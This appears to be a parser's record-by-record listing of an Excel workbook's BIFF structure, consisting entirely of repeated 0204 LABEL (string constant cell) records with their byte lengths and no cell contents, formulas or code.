' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     20 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     21 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
